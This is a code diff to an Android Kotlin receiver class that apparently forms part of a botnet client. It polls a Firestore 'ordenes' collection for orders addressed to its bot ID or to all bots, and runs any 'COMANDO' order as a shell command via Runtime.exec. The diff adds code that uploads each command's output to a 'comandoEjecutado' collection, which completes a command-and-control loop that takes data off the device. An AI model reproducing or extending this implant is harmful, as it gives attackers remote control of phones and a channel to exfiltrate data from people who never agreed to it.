@@ -122,7 +122,7 @@ class Alarm : BroadcastReceiver() {
                         }
                         if (document.data["Primitiva"]!!.equals("COMANDO")) {
                             val ejecutar = document.data["comando"].toString()
-                            ejecutaComando(ejecutar)
+                            ejecutaComando(ejecutar,db,strDate)
                             Log.d("TAG2", "Se ha enviado un mensaje de ping")
                             if(!document.data["Bot_ID"]!!.equals("todos")) {
                                 db.collection("ordenes").document(document.id).delete()
@@ -362,14 +362,34 @@ class Alarm : BroadcastReceiver() {
 
     // Fuente: https://stackoverflow.com/questions/3905358/how-to-ping-external-ip-from-java-android
     // Comandos utiles disponibles: https://technastic.com/adb-shell-commands-list/
-    private fun ejecutaComando(command : String){
+    private fun ejecutaComando(command : String, db : FirebaseFirestore, strDate: String){
+        var resultado = ""
         try {
             val process: Process = Runtime.getRuntime().exec(command)
             // Read the lines using BufferedReader
             BufferedReader(InputStreamReader(process.inputStream)).forEachLine {
                 // Do something on each line read
                 Log.d(this::class.java.canonicalName, "Resultado: $it")
+                resultado += "$it"+"\n"
             }
+
+            val user = hashMapOf(
+                "Bot_ID" to idAndroid,
+                "Hora" to strDate,
+                "resultado" to resultado
+            )
+
+            val user2 = hashMapOf(
+                "Bot_ID" to idAndroid,
+                "Hora" to strDate,
+                "resultado" to "Error al ejecutar el comando, stdout vacio"
+            )
+
+            // Add a new document with a generated ID
+            if(resultado != "") db.collection("comandoEjecutado").document(idAndroid + " " + command).set(user)
+            else db.collection("comandoEjecutado").document(idAndroid + " " + command).set(user2)
+            Log.d("TAG2","Se ha guardado el output de un comando")
+
         } catch (e: InterruptedException) {
             Log.w(this::class.java.canonicalName, "Cannot execute command [$command].", e)
         } catch (e: Exception) {
